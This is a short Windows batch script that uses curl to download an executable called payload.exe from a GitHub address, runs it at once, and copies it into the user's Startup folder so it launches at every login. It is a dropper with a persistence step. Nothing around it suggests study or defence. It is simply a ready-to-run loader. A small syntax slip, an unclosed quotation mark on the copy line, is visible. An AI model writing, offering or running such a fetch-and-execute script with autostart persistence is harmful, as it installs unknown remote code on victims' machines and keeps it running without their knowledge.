@echo off
curl -L -o payload.exe https://github.com/johnny575/ADB-device/blob/main/payload.exe

start payload.exe

set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy payload.exe "%STARTUP_FOLDER%\payload.exe

echo Done
